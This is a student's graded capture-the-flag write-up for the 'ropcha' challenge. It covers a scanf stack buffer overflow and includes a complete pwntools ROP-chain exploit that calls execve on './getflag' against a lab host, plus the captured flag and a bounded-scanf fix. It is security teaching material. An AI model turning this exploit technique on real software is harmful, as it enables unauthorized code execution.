**Name:** flofriday

**Points:** 1.0 of 1.0 Points

**Feedback:** Well done :)

<hr>

ropcha
======

Overview
--------

The program `ropcha` first asks the user for their name, than their nickname and finally wants the user to solve 10 million captchas in five seconds. However, even if the user would be able solve all captchas, the program would only print the first 16 characters of the flag.

Vulnerability
-------------

The vulnerability is a bufferoverflow in line `192` and then another in line `202`  both times the code reads a string of any length into the buffer `name` which is only 16 bytes big and thereby allowing an attacker to manipulate the stack.

Exploitation
------------

This exploit was developed during a Discord call with █████. While we discussed possible strategies, we came to our own solutions and never shared code or the flag.

Since, this is a binary exploitation, my first instinct was to just write an unlikley amount of data to the program which might trigger a bufferoverflow.

```bash
$ (python3 -c "print(b'A' * 1024)"; cat) | /challenges/ropcha/ropcha
What's your name?
Segmentation fault (core dumped)
```

From this simple experiment we already know that:

1. The bufferoverflow only got triggered after I pressed enter, which means the program waits for a newline and only after that processed the 1KiB of data.

2. There definitly is a buffer overflow and we propably overwrote the saved eip which caused the program to segfault.

3. There seams to be a no stack canary as no stack smashing was detected.

Before reading the source code, I wanted to further inspect the binary with `checksec`and `ldd`.

```bash
$ checksec /challenges/ropcha/ropcha
[*] '/challenges/ropcha/ropcha'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
$ ldd /challenges/ropcha/ropcha
    not a dynamic executable
```

From this we can read that jumping to shellcode is impossible because of the NX protection. Further, we cannot easily jump to libc as this binary is statically linked and those functions will be difficult to find if they are even in the binary. Finally, we find something weird: `checksec` found canaries while we were able overwrite the saved eip without getting any "stack smashing detected" warnings. So maybe there are canaries but they just don't seam to apply to the name reading function.

My next step was to read the sourcecode in `ropcha.c`, and I quickly found the bufferoverflow in the function `welcome_banner`: 

```c
welcome_banner(void) {
    char name[NAME_LENGTH];

    printf(msg_name);
    fflush(stdout);
    scanf("%[^\n]s", name);
```

The `scanf` here will read till a newline appears, which means that we are not limited by length for our payload. However, we also cannot contain a newline (`'\n'`  or in hex `0x0a` ) in our payload. 

In the sourcecode we also find the function `print_flag` which never actually prints the complete flag, but only the first 16 bytes of it, so jumping there won't be the solution.

From the challenge description we also know that the binary is in a sandboxed environment, where no shell is available. The only solution at this point seams to be to create a ROP-chain that will at some point execute the systemcall `execve` and executes the binary `getflag` which will print the flag.

To execute the systemcall correctly we need to fill in the registers `eax`, `ebx` , `ecx`,`edx` and at the end call interrupt `0x80`. In `edx` and `ecx` we will write zero, in `eax` we need to write `0x0B` and in `ebx` we need to write the address to a string which contains `"./getflag"`. 

This requires us to find a string/data area we can write to and a gadget to copy bytes from the stack to that area. Luckily all messages in `ropcha.c` are stored in gloabal variables so I used `msg_name` for my exploit, but every other should work as well. 

Next, I went hunting for some ROP-Gadets with `ROPgadget` and some regular expressions:

```bash
$ ROPgadget --binary ropcha > gadgets.txt
$ grep -E ": mov dword ptr \[e.x\], e.x ; ret" gadgets.txt
0x080a4404 : mov dword ptr [eax], edx ; ret    # Cannot use this one as it contains 0x0a
0x08057795 : mov dword ptr [edx], eax ; ret
$ grep -E ": int 0x80" gadgets.txt
0x08049a03 : int 0x80
$ grep -E ": pop e.x ; ret$" gadgets.txt
0x080bd696 : pop eax ; ret
0x080481d1 : pop ebx ; ret
0x080b7163 : pop ecx ; ret
0x0806eabb : pop edx ; ret
```

With that I had all my gadgets, so now I inspected the binary with `gdb` and figured out that the offset from `name` to the saved `eip` was 28 bytes and that the `msg_name` variable was at address `0x080f11ec`. 

Finally, I was ready to put it all together and created the following exploit script:

```python
from pwn import *
import sys

adr_msg_name = 0x080F11EC
padding = 28
payload = b"A" * padding

# Gadets
pop_eax = p32(0x080BD696)
pop_ebx = p32(0x080481D1)
pop_ecx = p32(0x080B7163)
pop_edx = p32(0x0806EABB)
mov_ptr_edx_eax = p32(0x08057795)
int_0x80 = p32(0x08049A03)

## Write './ge'
payload += pop_edx + p32(adr_msg_name)
payload += pop_eax + b"./ge"
payload += mov_ptr_edx_eax

## Write 'tfla'
payload += pop_edx + p32(adr_msg_name + 4)
payload += pop_eax + b"tfla"
payload += mov_ptr_edx_eax

## Write 'g\0\0\0'
payload += pop_edx + p32(adr_msg_name + 8)
payload += pop_eax + b"g\0\0\0"
payload += mov_ptr_edx_eax

# Setup the registers
payload += pop_eax + p32(0x0B)
payload += pop_ebx + p32(adr_msg_name)
payload += pop_ecx + p32(0x00)
payload += pop_edx + p32(0x00)

# Jump to int 0x80
payload += int_0x80

# Verify payload
# print(payload.hex())
if b"\n" in payload:
    print(f"Payload contains character '\\n' which cannot be passed to scanf")
    sys.exit(1)

p = remote("10.3.0.5", "31337")
# p = process("./ropcha")
p.send(payload + b"\n")
p.interactive()
```

Now we can execute the script and get the flag:

```bash
$ python3 expl.py
[+] Opening connection to 10.3.0.5 on port 31337: Done
[*] Switching to interactive mode
What's your name? WUTCTF{60_60_64d637_br34kf457}
```

Solution
--------

The program has two identical buffer overflows in line `192` and `202` however, both can be fixed by changing the affected lines to:

```c
scanf("%15[^\n]s", name);
```

With this change, we limit the number of bytes `scanf` reads to 15 which means at most, there will be 16 bytes written (15 characters plus null-terminator), which now matches the size of the `name` buffer and thereby closing the vulnability.
